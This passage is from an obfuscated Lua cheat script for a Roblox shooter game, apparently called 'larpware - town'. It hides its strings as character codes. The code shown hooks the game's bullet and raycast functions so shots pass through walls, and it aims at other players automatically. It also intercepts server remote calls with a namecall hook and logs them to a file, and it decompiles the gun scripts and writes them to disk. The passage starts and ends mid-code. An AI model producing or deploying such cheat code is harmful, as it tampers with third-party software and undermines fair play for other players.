_nd,_od,_pd=_R,_qd,_Sa end end end end return _nd,_od end local function _rd()_Oc.locked=nil if _Oc.savedSensitivity then local _ec=_Oc.savedSensitivity _Oc.savedSensitivity=nil pcall(function()_c.MouseDeltaSensitivity=_ec end)end end local function _sd(_td)return _c:IsMouseButtonPressed(_td)end local function _ud()local _V=_h.Character if not _V then return nil end for _O,_vd in ipairs(_V:GetChildren())do if _vd:IsA(string.char(84,111,111,108))and _vd:FindFirstChild(string.char(71,117,110,83,99,114,105,112,116))then return _vd end end return nil end local function _wd()if not _m.aimgun then return true end local _V=_h.Character if not _V then return false end return _V:FindFirstChild(string.char(71,85,78,65,73,77,86,65,76,85,69))~=nil or _ud()~=nil end local _xd={_zd=nil,_i=nil,_je=nil,rayOrig=nil,rayWrap=nil,fireOrig=nil,fireWrap=nil,inFire=false,alive=true,spyHooked=false,wallbang=false,shotWalled=false,_Vd=0,lastInstance=nil,lastShot=nil,fireCalls=0,}local function _yd(_zd)local _Ad=_zd:FindFirstChild(string.char(71,117,110,83,99,114,105,112,116))if _Ad and type(getsenv)==string.char(102,117,110,99,116,105,111,110)then local _I,_i=pcall(getsenv,_Ad)if _I and type(_i)==string.char(116,97,98,108,101)then return _i,string.char(103,101,116,115,101,110,118)end end if type(getgc)==string.char(102,117,110,99,116,105,111,110)then local _I,_Bd=pcall(getgc,true)if _I and type(_Bd)==string.char(116,97,98,108,101)then for _O,_Cd in ipairs(_Bd)do if type(_Cd)==string.char(116,97,98,108,101)and type(rawget(_Cd,string.char(82,97,121,67,97,115,116,50)))==string.char(102,117,110,99,116,105,111,110)and type(rawget(_Cd,string.char(102,105,114,101,66,117,108,108,101,116)))==string.char(102,117,110,99,116,105,111,110)then return _Cd,string.char(103,101,116,103,99)end end end end return nil,nil end local _Dd=RaycastParams.new()_Dd.FilterType=Enum.RaycastFilterType.Include _Dd.IgnoreWater=true local function _Ed()return _xd.alive and not _m.freecam and _m.wallbang and _Ec[_Fc]~=string.char(80,97,114,116,115)end local function _Fd()local _Bd={}for _O,_R in ipairs(_a:GetPlayers())do local _V=_R~=_h and _R.Character if _V then for _O,_ac in ipairs(_V:GetChildren())do if _ac:IsA(string.char(66,97,115,101,80,97,114,116))and _ac.Transparency<1 then table.insert(_Bd,_ac)end end end end return _Bd end local function _Gd(_Hd)return function(_Z,_Id,_Sa,_Jd,_Rb,_Kd,...)local _Ld=_xd.inFire and(_Kd==nil or _Kd<=1)and typeof(_Z)==string.char(86,101,99,116,111,114,51)if _Ld and _xd.wallbang and typeof(_Id)==string.char(86,101,99,116,111,114,51)and type(_Sa)==string.char(110,117,109,98,101,114)then local _I,_Ob=pcall(_d.Raycast,_d,_Z+_Id*0.01,_Id*_Sa,_Dd)if _I and _Ob then _Rb=_Dd _xd.shotWalled=true end end local _Md=table.pack(_Hd(_Z,_Id,_Sa,_Jd,_Rb,_Kd,...))if _Ld then _xd.lastInstance=_Md[1]end return table.unpack(_Md,1,_Md.n)end end local _Nd={relayedAt=0,bloodAt=0,bloodChar=nil}do local _Od=_g:FindFirstChild(string.char(66,117,108,108,101,116,69,118,101,110,116))if _Od then table.insert(_q,_Od.OnClientEvent:Connect(function(_Pd,_Qd)if _Pd==_h and _Qd==string.char(66,117,108,108,101,116,82,101,110,100,101,114)then _Nd.relayedAt=os.clock()end end))end local _Rd=_g:FindFirstChild(string.char(66,108,111,111,100,69,118,101,110,116))if _Rd then table.insert(_q,_Rd.OnClientEvent:Connect(function(_V)if typeof(_V)==string.char(73,110,115,116,97,110,99,101)then _Nd.bloodChar,_Nd.bloodAt=_V,os.clock()end end))end end local function _Sd(_Td)local _ac=_xd.lastInstance _xd.lastInstance=nil if not _ac then _xd.lastShot=string.char(114,97,121,32,104,105,116,32,110,111,116,104,105,110,103)return end local _cc=_ac.Parent and _ac:FindFirstAncestorOfClass(string.char(77,111,100,101,108))local _ya=_cc and _cc~=_h.Character and _cc:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))if not _ya then _xd.lastShot=string.char(114,97,121,32,104,105,116,32).._ac.Name..string.char(32,40,110,111,116,32,97,32,112,108,97,121,101,114,41)return end local _Ud,_F,_Vd=_ya.Health,_cc.Name,_xd.shotWalled _xd.lastShot=_F..string.char(58,32,119,97,105,116,105,110,103,46,46,46)task.delay(0.9,function()local _Wd=_ya.Health local _Xd=_Nd.relayedAt>=_Td local _Yd=_Nd.bloodChar==_cc and _Nd.bloodAt>=_Td local _Zd if _Wd<_Ud or _Yd then _Zd=string.char(65,67,67,69,80,84,69,68)elseif _Xd then _Zd=string.char(114,101,108,97,121,101,100,44,32,78,79,32,68,65,77,65,71,69)else _Zd=string.char(68,82,79,80,80,69,68,32,98,121,32,115,101,114,118,101,114)end _xd.lastShot=string.format(string.char(37,115,37,115,58,32,37,115,32,40,104,112,32,37,100,62,37,100,41),_F,_Vd andstring.char(32,91,119,97,108,108,93)or"",_Zd,_Ud,_Wd)end)end local function _ae(_Hd)return function(...)local _Td=os.clock()_xd.fireCalls+=1 _xd.wallbang,_xd.shotWalled,_xd.lastInstance=false,false,nil if _xd.alive and not _m.freecam and _m.wallbang and _Ec[_Fc]~=string.char(80,97,114,116,115)then _xd.wallbang=true _Dd.FilterDescendantsInstances=_Fd()end _xd.inFire=true local _Md=table.pack(pcall(_Hd,...))_xd.inFire=false if _xd.shotWalled then _xd._Vd+=1 end pcall(_Sd,_Td)_xd.wallbang,_xd.shotWalled=false,false if not _Md[1]then error(_Md[2],0)end return table.unpack(_Md,2,_Md.n)end end local function _be()if not _Ed()then return end local _zd=_ud()if _zd~=_xd._zd then _xd._zd,_xd._i,_xd._je=_zd,nil,nil _xd.rayWrap,_xd.fireWrap=nil,nil end if not _zd then return end if not _xd._i then _xd._i,_xd._je=_yd(_zd)end local _i=_xd._i if not _i then return end local _Nb=_i.RayCast2 if type(_Nb)==string.char(102,117,110,99,116,105,111,110)and _Nb~=_xd.rayWrap then _xd.rayOrig=_Nb _xd.rayWrap=_Gd(_Nb)pcall(rawset,_i,string.char(82,97,121,67,97,115,116,50),_xd.rayWrap)end local _ce=_i.fireBullet if type(_ce)==string.char(102,117,110,99,116,105,111,110)and _ce~=_xd.fireWrap then _xd.fireOrig=_ce _xd.fireWrap=_ae(_ce)_xd.fireCalls=0 pcall(rawset,_i,string.char(102,105,114,101,66,117,108,108,101,116),_xd.fireWrap)end end local _de={}local _ee=0 local _fe=RaycastParams.new()_fe.FilterType=Enum.RaycastFilterType.Exclude local function _ge(_he)for _ac,_tb in pairs(_de)do if not(_he and _he[_ac])then if _ac.Parent then _ac.CanCollide=_tb end _de[_ac]=nil end end end local function _ie()if not _m.wallbang or _m.freecam or not _xd.alive then return false end local _je=_Ec[_Fc]if _je==string.char(69,110,103,105,110,101)then return false end if _je==string.char(65,117,116,111)and _xd.rayWrap and _xd.fireWrap and _xd.fireCalls>0 then return false end return _ud()~=nil end local function _ke()if not _ie()then _ge(nil)return end local _le=os.clock()local _me=_sd(Enum.UserInputType.MouseButton1)or _sd(Enum.UserInputType.MouseButton2)if _me then _ee=_le elseif _le-_ee>0.3 then _ge(nil)return else return end local _U=_d.CurrentCamera if not _U then return end local _Fa=_ed(_U)local _Nb=_U:ViewportPointToRay(_Fa.X,_Fa.Y)local _X={_h.Character}local _ne,_he,_oe={},{},false for _O=1,12 do _fe.FilterDescendantsInstances=_X local _Ob=_d:Raycast(_Nb.Origin,_Nb.Direction*900,_fe)if not _Ob then break end local _ac=_Ob.Instance local _cc=_ac:FindFirstAncestorOfClass(string.char(77,111,100,101,108))local _pe=_cc and _a:GetPlayerFromCharacter(_cc)if _pe and _pe~=_h then _oe=true break end if _ac:IsA(string.char(84,101,114,114,97,105,110))then break end if _ac.CanCollide or _de[_ac]~=nil then table.insert(_ne,_ac)end table.insert(_X,_ac)end if not _oe then _ge(nil)return end for _O,_ac in ipairs(_ne)do _he[_ac]=true if _de[_ac]==nil then _de[_ac]=_ac.CanCollide _ac.CanCollide=false end end _ge(_he)end local function _qe()local _re={{string.char(103,101,116,115,101,110,118),type(getsenv)==string.char(102,117,110,99,116,105,111,110)},{string.char(103,101,116,103,99),type(getgc)==string.char(102,117,110,99,116,105,111,110)},{string.char(104,111,111,107,109,101,116,97,109,101,116,104,111,100),type(hookmetamethod)==string.char(102,117,110,99,116,105,111,110)},{string.char(104,111,111,107,102,117,110,99,116,105,111,110),type(hookfunction)==string.char(102,117,110,99,116,105,111,110)},{string.char(103,101,116,110,97,109,101,99,97,108,108,109,101,116,104,111,100),type(getnamecallmethod)==string.char(102,117,110,99,116,105,111,110)},{string.char(110,101,119,99,99,108,111,115,117,114,101),type(newcclosure)==string.char(102,117,110,99,116,105,111,110)},{string.char(99,104,101,99,107,99,97,108,108,101,114),type(checkcaller)==string.char(102,117,110,99,116,105,111,110)},{string.char(100,101,99,111,109,112,105,108,101),type(decompile)==string.char(102,117,110,99,116,105,111,110)},{string.char(119,114,105,116,101,102,105,108,101),type(writefile)==string.char(102,117,110,99,116,105,111,110)},{string.char(97,112,112,101,110,100,102,105,108,101),type(appendfile)==string.char(102,117,110,99,116,105,111,110)},{string.char(102,105,114,101,99,108,105,99,107,100,101,116,101,99,116,111,114),type(fireclickdetector)==string.char(102,117,110,99,116,105,111,110)},{string.char(100,101,98,117,103,46,115,101,116,117,112,118,97,108,117,101),type(debug)==string.char(116,97,98,108,101)and type(debug.setupvalue)==string.char(102,117,110,99,116,105,111,110)},{string.char(109,111,117,115,101,109,111,118,101,114,101,108),type(mousemoverel)==string.char(102,117,110,99,116,105,111,110)},{string.char(109,111,117,115,101,109,111,118,101,97,98,115),type(mousemoveabs)==string.char(102,117,110,99,116,105,111,110)},}local function _se(_I)return string.format(string.char(60,102,111,110,116,32,99,111,108,111,114,61,34,37,115,34,62,37,115,60,47,102,111,110,116,62),_I andstring.char(35,53,97,102,102,55,56)orstring.char(35,102,102,53,97,53,97),_I andstring.char(121,101,115)orstring.char(78,79))end local _te=_re[1][2]or _re[2][2]local _ue=_re[3][2]and _re[5][2]local _la={string.char(83,105,108,101,110,116,32,97,105,109,58,32).._se(_te),string.char(82,101,109,111,116,101,32,83,112,121,58,32).._se(_ue),"",}for _O,_ve in ipairs(_re)do table.insert(_la,_ve[1]..string.char(58,32).._se(_ve[2]))end return table.concat(_la,string.char(10))end local _we=string.char(84,111,119,110,69,115,112,82,101,109,111,116,101,76,111,103,46,116,120,116)local _xe=string.char(84,111,119,110,69,115,112,71,117,110,68,117,109,112,46,116,120,116)local _ye=string.char(84,111,119,110,69,115,112,71,117,110,83,99,114,105,112,116,46,116,120,116)local _ze={CameraEvent=true}local _Ae=0 local function _Be(_Ce,_Kd)local _Cd=typeof(_Ce)if _Cd==string.char(115,116,114,105,110,103)then return string.format(string.char(37,113),string.sub(_Ce,1,60))end if _Cd==string.char(110,117,109,98,101,114)or _Cd==string.char(98,111,111,108,101,97,110)or _Cd==string.char(110,105,108)then return tostring(_Ce)end if _Cd==string.char(73,110,115,116,97,110,99,101)then local _I,_F=pcall(function()return _Ce:GetFullName()end)returnstring.char(60)..(_I and _F orstring.char(63))..string.char(62)end if _Cd==string.char(116,97,98,108,101)then local _De,_Eb={},0 for _Ee,_Fe in pairs(_Ce)do _Eb+=1 if _Eb<=6 then table.insert(_De,tostring(_Ee)..string.char(61)..(_Kd<1 and _Be(_Fe,_Kd+1)or typeof(_Fe)))end end returnstring.char(123)..table.concat(_De,string.char(44,32))..(_Eb>6 andstring.char(44,32,46,46,46)or"")..string.char(125)end return _Cd..string.char(58)..tostring(_Ce)end local function _Ge(_He,_je,_Ie)local _I,_K=pcall(function()local _De={}for _ma=1,_Ie.n do _De[_ma]=_Be(_Ie[_ma],0)end return string.format(string.char(91,37,46,50,102,93,32,37,115,58,37,115,40,37,115,41),os.clock()%10000,_He:GetFullName(),_je,table.concat(_De,string.char(44,32)))end)if not _I then return end _Ae+=1 print(string.char(91,84,111,119,110,69,115,112,32,115,112,121,93,32).._K)if type(appendfile)==string.char(102,117,110,99,116,105,111,110)then pcall(appendfile,_we,_K..string.char(10))end if _Lc then _Lc()end end local function _Je()local _V=_h.Character local _zd=_V and _V:FindFirstChildOfClass(string.char(84,111,111,108))if not _zd then local _Ke=_h:FindFirstChildOfClass(string.char(66,97,99,107,112,97,99,107))_zd=_Ke and _Ke:FindFirstChildOfClass(string.char(84,111,111,108))end if not _zd then return false,string.char(78,111,32,116,111,111,108)end if type(writefile)~=string.char(102,117,110,99,116,105,111,110)then return false,string.char(78,111,32,119,114,105,116,101,102,105,108,101)end local _Ba=_zd:GetFullName()local _la={string.char(84,111,111,108,58,32).._Ba,""}local function _Le(_Me)return(_Me:GetFullName():sub(#_Ba+2))end local _Ne=_zd:GetAttributes()for _oc,_Oe in pairs(_Ne)do table.insert(_la,string.char(97,116,116,114,32).._oc..string.char(32,61,32)..tostring(_Oe))end for _O,_Fb in ipairs(_zd:GetDescendants())do local _pa=_Fb.ClassName..string.char(32,32).._Le(_Fb)if _Fb:IsA(string.char(86,97,108,117,101,66,97,115,101))then _pa..=string.char(32,32,61,32)..tostring(_Fb.Value)end table.insert(_la,_pa)if _Fb:IsA(string.char(76,117,97,83,111,117,114,99,101,67,111,110,116,97,105,110,101,114))then local _I,_Pe=false,nil if type(decompile)==string.char(102,117,110,99,116,105,111,110)then _I,_Pe=pcall(decompile,_Fb)end if _I and type(_Pe)==string.char(115,116,114,105,110,103)and#_Pe>0 then table.insert(_la,string.char(45,45,45,45,32,115,111,117,114,99,101,32,111,102,32).._Le(_Fb)..string.char(32,45,45,45,45))table.insert(_la,_Pe)table.insert(_la,string.char(45,45,45,45,32,101,110,100,32,45,45,45,45))if _Fb.Name==string.char(71,117,110,83,99,114,105,112,116)and _Fb:IsA(string.char(76,111,99,97,108,83,99,114,105,112,116))then pcall(writefile,_ye,_Pe)end else table.insert(_la,string.char(32,32,40,115,111,117,114,99,101,32,110,111,116,32,114,101,97,100,97,98,108,101,58,32,115,101,114,118,101,114,32,115,99,114,105,112,116,32,111,114,32,110,111,32,100,101,99,111,109,112,105,108,101,41))end end end pcall(writefile,_xe,table.concat(_la,string.char(10)))return true,_zd.Name end if type(hookmetamethod)==string.char(102,117,110,99,116,105,111,110)and type(getnamecallmethod)==string.char(102,117,110,99,116,105,111,110)then local _Qe=type(newcclosure)==string.char(102,117,110,99,116,105,111,110)and newcclosure or function(_Re)return _Re end local _I,_Se=pcall(function()local _Te _Te=hookmetamethod(game,string.char(95,95,110,97,109,101,99,97,108,108),_Qe(function(self,...)if _xd.alive and _m.spy then local _je=getnamecallmethod()if(_je==string.char(70,105,114,101,83,101,114,118,101,114)or _je==string.char(73,110,118,111,107,101,83,101,114,118,101,114))and not _ze[self.Name]then task.defer(_Ge,self,_je,table.pack(...))end end return _Te(self,...)end))end)_xd.spyHooked=_I if not _I then warn(string.char(91,84,111,119,110,69,115,112,93,32,114,101,109,111,116,101,32,115,112,121,32,104,111,111,107,32,102,97,105,108,101,100,58,32)..tostring(_Se))end end local function _Ue(_U,_ac,_mc)local _Ve=Vector3.zero if _m.aimoffset then local _ya=_ac.Parent and _ac.Parent:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))if _ya then _Ve=_ya.MoveDirection*(math.clamp(_Ic,1,30)/10)end end local _We=_ac.Position+_Ve if _Bc[_Dc]==string.char(77,111,117,115,101)and type(mousemoverel)==string.char(102,117,110,99,116,105,111,110)then local _Xe=_U:WorldToViewportPoint(_We)local _Lb=_c:GetMouseLocation()local _Ye=1+_Hc/10 mousemoverel((_Xe.X-_Lb.X)/_Ye,(_Xe.Y-_Lb.Y)/_Ye)return end if _Bc[_Dc]==string.char(65,98,115,111,108,117,116,101)and type(mousemoveabs)==string.char(102,117,110,99,116,105,111,110)then local _Xe=_U:WorldToViewportPoint(_We)local _Lb=_c:GetMouseLocation()local _Ye=1+_Hc/10 mousemoveabs(_Lb.X+(_Xe.X-_Lb.X)/_Ye,_Lb.Y+(_Xe.Y-_Lb.Y)/_Ye)return end if not _Oc.savedSensitivity then _Oc.savedSensitivity=_c.MouseDeltaSensitivity end pcall(function()_c.MouseDeltaSensitivity=0 end)local _Z=_U.CFrame.Position local _Ze=(_We-_Z)if _Ze.Magnitude<0.001 then return end local _af=_Hc<=0 and 1 or(1-(_Hc/100)^(_mc*60))local _bf=_U.CFrame.LookVector:Lerp(_Ze.Unit,math.clamp(_af,0,1))if _bf.Magnitude>=1e-3 then _U.CFrame=CFrame.lookAt(_Z,_Z+_bf)end end local function _cf(_mc)local _U=_d.CurrentCamera if not _U then return end _Pc.Visible=_m.aimbot and _m.aimcircle and not _m.freecam if _Pc.Visible then local _Fa=_ed(_U)_Pc.Size=UDim2.fromOffset(_Gc*2,_Gc*2)_Pc.Position=UDim2.fromOffset(_Fa.X,_Fa.Y)_Qc.Color=_Oc.locked and _Rc or _l end local _df if _m.aimbot and _m.aimtracer and not _m.freecam and not _Oc.locked and _wd()then local _O,_oe=_md(_U)_df=_oe end if _df then local _Ea=_U.ViewportSize local _ef=_Tc==1 and Vector2.new(_Ea.X/2,_Ea.Y)or _Tc==2 and _Ea/2 or _ed(_U)local _Xe=_U:WorldToViewportPoint(_df.Position)_ta(_Vc,_ef,Vector2.new(_Xe.X,_Xe.Y))else _Vc.Visible=false end pcall(_ke)local _le=os.clock()if _le-_Nc>0.2 then _Nc=_le pcall(_be)end if _le-_Mc>0.25 then _Mc=_le if _Kc then local _ff=0 for _O in pairs(_de)do _ff+=1 end _Kc.Text=string.format(string.char(71,117,110,58,32,37,115,32,32,69,110,103,105,110,101,58,32,37,115,32,40,115,104,111,116,115,32,115,101,101,110,58,32,37,100,41,10,84,104,114,111,117,103,104,32,119,97,108,108,115,58,32,37,100,32,32,79,112,101,110,101,100,58,32,37,100,10,76,97,115,116,58,32,37,115),_ud()andstring.char(121,101,115)orstring.char(78,79),_xd._je orstring.char(78,79,78,69),_xd.fireCalls,_xd._Vd,_ff,_xd.lastShot orstring.char(45))end if _Jc then local _gf=_m.aimbot and(_md(_U))or nil _Jc.Text=string.format(string.char(76,111,99,107,101,100,58,32,37,115,10,78,101,97,114,101,115,116,58,32,37,115),_Oc.locked and _Oc.locked.Name orstring.char(110,111),_gf and _gf.Name orstring.char(110,111,110,101))end end if not _m.aimbot or _m.freecam or not _Oc.running or _c:GetFocusedTextBox()or not _wd()then if _Oc.locked or _Oc.savedSensitivity then _rd()end return end local _ac if _Oc.locked then _ac=_jd(_Oc.locked,_U)local _Sa=_ac and _kd(_U,_ac)if not _ac or not _Sa or _Sa>_Gc then _rd()_ac=nil end end if not _ac then local _R,_oe=_md(_U)if _R then _Oc.locked=_R _ac=_oe end end if _ac then _Ue(_U,_ac,_mc)else _rd()end end table.insert(_q,_c.InputBegan:Connect(function(_Vb)if _Vb.UserInputType~=Enum.UserInputType.MouseButton2 or _c:GetFocusedTextBox()then return end if _m.aimtoggle then _Oc.running=not _Oc.running if not _Oc.running then _rd()end else _Oc.running=true end end))table.insert(_q,_c.InputEnded:Connect(function(_Vb)if _Vb.UserInputType~=Enum.UserInputType.MouseButton2 then return end if not _m.aimtoggle then _Oc.running=false _rd()end end))pcall(function()_b:BindToRenderStep(string.char(84,111,119,110,69,115,112,65,105,109),Enum.RenderPriority.Camera.Value+1,_cf)end)local _hf={alive=true}do local _if=8 local _jf=6 local _kf=30 local _lf=1.5 local _mf=300 local _nf=string.char(35,53,97,102,102,55,56)local _of=string.char(35,102,102,53,97,53,97)local _pf=setmetatable({},{__mode=string.char(107)})local _qf=setmetatable({},{__mode=string.char(107)})local _la,_rf={},0 local _sf=game:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101))local _tf=Instance.new(string.char(70,114,97,109,101))_tf.AnchorPoint=Vector2.new(1,1)_tf.Position=UDim2.new(1,-14,1,-70)_tf.Size=UDim2.fromOffset(360,200)_tf.BackgroundTransparency=1 _tf.Parent=_ca local _uf=Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116))_uf.SortOrder=Enum.SortOrder.LayoutOrder _uf.HorizontalAlignment=Enum.HorizontalAlignment.Right _uf.VerticalAlignment=Enum.VerticalAlignment.Bottom _uf.Padding=UDim.new(0,4)_uf.Parent=_tf local function _vf(_ga)if not _ga.Parent then return end local _wf=TweenInfo.new(0.4)_sf:Create(_ga,_wf,{BackgroundTransparency=1,TextTransparency=1,TextStrokeTransparency=1}):Play()local _fa=_ga:FindFirstChildOfClass(string.char(85,73,83,116,114,111,107,101))if _fa then _sf:Create(_fa,_wf,{Transparency=1}):Play()end task.delay(0.45,function()if _ga.Parent then _ga:Destroy()end end)end local function _xf(_J)_rf+=1 local _ga=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_ga.LayoutOrder=_rf _ga.AutomaticSize=Enum.AutomaticSize.X _ga.Size=UDim2.fromOffset(0,22)_ga.BackgroundColor3=Color3.fromRGB(20,20,20)_ga.BackgroundTransparency=0.25 _ga.BorderSizePixel=0 _ga.Font=Enum.Font.Code _ga.TextSize=14 _ga.RichText=true _ga.Text=_J _ga.TextColor3=_l _ga.TextStrokeTransparency=0.5 _ga.TextXAlignment=Enum.TextXAlignment.Center local _yf=Instance.new(string.char(85,73,80,97,100,100,105,110,103))_yf.PaddingLeft=UDim.new(0,8)_yf.PaddingRight=UDim.new(0,8)_yf.Parent=_ga local _fa=Instance.new(string.char(85,73,83,116,114,111,107,101))_fa.Color=Color3.fromRGB(0,85,255)_fa.Thickness=1 _fa.Parent=_ga _ga.Parent=_tf table.insert(_la,_ga)while#_la>_jf do local _zf=table.remove(_la,1)if _zf then _zf:Destroy()end end task.delay(_if,function()local _Af=table.find(_la,_ga)if _Af then table.remove(_la,_Af)end _vf(_ga)end)end local function _Bf(_F,_Cf,_Df)if _Cf then return string.format(string.char(60,102,111,110,116,32,99,111,108,111,114,61,34,37,115,34,62,37,115,60,47,102,111,110,116,62),_Df,_F)end return _F end local _Ef=setmetatable({},{__mode=string.char(107)})local function _Ff(_R,_V)local _W=_V:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if not _W then return end local _Gf,_pd=nil,_mf for _O,_Hf in ipairs(_a:GetPlayers())do local _If=_Hf.Character local _Jf=_If and _If:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))if _Hf~=_R and _Jf and _If:FindFirstChildOfClass(string.char(84,111,111,108))then local _Sa=(_Jf.Position-_W.Position).Magnitude if _Sa<_pd then _Gf,_pd=_Hf,_Sa end end end return _Gf end local function _Kf(_R,_V,_ya)if not _hf.alive or not _V or _pf[_V]then return end _pf[_V]=true if not _m.killlog then return end local _Lf,_Mf local _se=_ya and _ya:FindFirstChild(string.char(99,114,101,97,116,111,114))if _se and _se:IsA(string.char(79,98,106,101,99,116,86,97,108,117,101))then _Lf=_se.Value end local _Nf=_ya and _qf[_ya]if not _Lf and _Nf and os.clock()-_Nf.at<_kf then _Lf=_Nf._Oe end local _Of=_ya and _Ef[_ya]if not _Lf and _Of and os.clock()-_Of.at<_kf then _Lf,_Mf=_Of._Oe,true end local _Pf=_R.Name local _Qf=_R==_h if typeof(_Lf)==string.char(73,110,115,116,97,110,99,101)and _Lf~=_R then local _Rf=_Lf==_h _xf(string.format(string.char(37,115,32,107,105,108,108,101,100,32,37,115,37,115),_Bf(_Lf.Name,_Rf,_nf),_Bf(_Pf,_Qf,_of),_Mf andstring.char(32,40,63,41)or""))else _xf(string.format(string.char(37,115,32,100,105,101,100),_Bf(_Pf,_Qf,_of)))end end local function _Sf(_R,_V)task.spawn(function()local _ya=_V:WaitForChild(string.char(72,117,109,97,110,111,105,100),10)if not _ya or not _hf.alive then return end local function _Tf(_se)if _se.Name~=string.char(99,114,101,97,116,111,114)or not _se:IsA(string.char(79,98,106,101,99,116,86,97,108,117,101))then return end local function _Uf()if _se.Value then _qf[_ya]={_Oe=_se.Value,at=os.clock()}end end _Uf()_se:GetPropertyChangedSignal(string.char(86,97,108,117,101)):Connect(_Uf)end for _O,_vd in ipairs(_ya:GetChildren())do _Tf(_vd)end _ya.ChildAdded:Connect(_Tf)local _Vf=_ya.Health _ya.HealthChanged:Connect(function(_Wf)if _Wf<_Vf and _Wf>_lf then local _Xf=_Ff(_R,_V)if _Xf then _Ef[_ya]={_Oe=_Xf,at=os.clock()}end end if _Wf<=_lf then if _Vf>_lf or not _pf[_V]then local _Xf=_Ff(_R,_V)if _Xf then _Ef[_ya]={_Oe=_Xf,at=os.clock()}end _Kf(_R,_V,_ya)end else _pf[_V]=nil end _Vf=_Wf end)_V.ChildAdded:Connect(function(_vd)if _vd.Name==string.char(68,111,119,110,101,100)then _Kf(_R,_V,_ya)end end)_V.ChildRemoved:Connect(function(_vd)if _vd.Name==string.char(68,111,119,110,101,100)and _ya.Health>_lf then _pf[_V]=nil end end)_ya.Died:Connect(function()_Kf(_R,_V,_ya)end)if _ya.Health<=_lf and _ya.Health>0 and _V:FindFirstChild(string.char(68,111,119,110,101,100))then _Kf(_R,_V,_ya)end end)end local function _Yf(_R)if _R.Character then _Sf(_R,_R.Character)end table.insert(_q,_R.CharacterAdded:Connect(function(_V)_Sf(_R,_V)end))end for _O,_R in ipairs(_a:GetPlayers())do _Yf(_R)end table.insert(_q,_a.PlayerAdded:Connect(_Yf))local _Rd=_g:FindFirstChild(string.char(66,108,111,111,100,69,118,101,110,116))if _Rd then table.insert(_q,_Rd.OnClientEvent:Connect(function(_V,_Qd)if _Qd~=string.char(99,111,114,112,115,101)or typeof(_V)~=string.char(73,110,115,116,97,110,99,101)then return end local _R=_a:GetPlayerFromCharacter(_V)if _R then _Kf(_R,_V,_V:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100)))end end))end function _hf.clear()for _O,_ga in ipairs(_la)do _ga:Destroy()end _la={}end end local _Zf={back=Color3.fromRGB(28,28,28),main=Color3.fromRGB(20,20,20),accent=Color3.fromRGB(0,85,255),outline=Color3.fromRGB(50,50,50),_J=Color3.new(1,1,1),dim=Color3.fromRGB(150,150,150),}local _ag=Enum.Font.Code local function _bg(_cg,_dg,_Jb)local _eg=Instance.new(_cg)for _oc,_Oe in pairs(_dg)do _eg[_oc]=_Oe end _eg.Parent=_Jb return _eg end local _fg=_bg(string.char(83,99,114,101,101,110,71,117,105),{Name=string.char(76,97,114,112,119,97,114,101,77,101,110,117),ResetOnSpawn=false,DisplayOrder=2},_ba)local _gg=_bg(string.char(70,114,97,109,101),{Size=UDim2.fromOffset(560,430),Position=UDim2.fromOffset(60,60),BackgroundColor3=_Zf.back,BorderColor3=Color3.new(0,0,0),BorderSizePixel=1,Active=true,},_fg)_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,2),BackgroundColor3=_Zf.accent,BorderSizePixel=0},_gg)local _hg=_bg(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,0,0,24),Position=UDim2.fromOffset(0,2),BackgroundTransparency=1,Font=_ag,Text=string.char(32,32,108,97,114,112,119,97,114,101,32,45,32,116,111,119,110),TextSize=15,TextColor3=_Zf._J,TextXAlignment=Enum.TextXAlignment.Left,},_gg)local _ig=_bg(string.char(70,114,97,109,101),{Position=UDim2.fromOffset(8,28),Size=UDim2.new(1,-16,0,22),BackgroundTransparency=1,},_gg)_bg(string.char(85,73,76,105,115,116,76,97,121,111,117,116),{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,2),SortOrder=Enum.SortOrder.LayoutOrder,},_ig)local _jg=_bg(string.char(70,114,97,109,101),{Position=UDim2.fromOffset(8,50),Size=UDim2.new(1,-16,1,-76),BackgroundColor3=_Zf.back,BorderColor3=_Zf.outline,BorderSizePixel=1,},_gg)local _kg=_bg(string.char(84,101,120,116,76,97,98,101,108),{Position=UDim2.new(0,10,1,-20),Size=UDim2.new(1,-20,0,16),BackgroundTransparency=1,Font=_ag,TextSize=12,TextColor3=_Zf.dim,TextXAlignment=Enum.TextXAlignment.Left,Text="",},_gg)local _lg=0 local function _mg(_J)_lg+=1 local _Y=_lg _kg.Text=_J task.delay(2.5,function()if _lg==_Y then _kg.Text=""end end)end local _ng table.insert(_q,_c.InputChanged:Connect(function(_Vb)if _ng and(_Vb.UserInputType==Enum.UserInputType.MouseMovement or _Vb.UserInputType==Enum.UserInputType.Touch)then _ng(_Vb.Position.X)end end))table.insert(_q,_c.InputEnded:Connect(function(_Vb)if _Vb.UserInputType==Enum.UserInputType.MouseButton1 or _Vb.UserInputType==Enum.UserInputType.Touch then _ng=nil end end))local _og,_pg table.insert(_q,_c.InputBegan:Connect(function(_Vb)if _og and _Vb.UserInputType==Enum.UserInputType.Keyboard then local _qg=_og _og,_pg=nil,_Vb _qg(_Vb.KeyCode)end end))local function _rg(_sg,_tg)local _ea=_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,-6,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundColor3=_Zf.main,BorderColor3=_Zf.outline,BorderSizePixel=1,},_sg)_bg(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,2),BackgroundColor3=_Zf.accent,BorderSizePixel=0},_ea)local 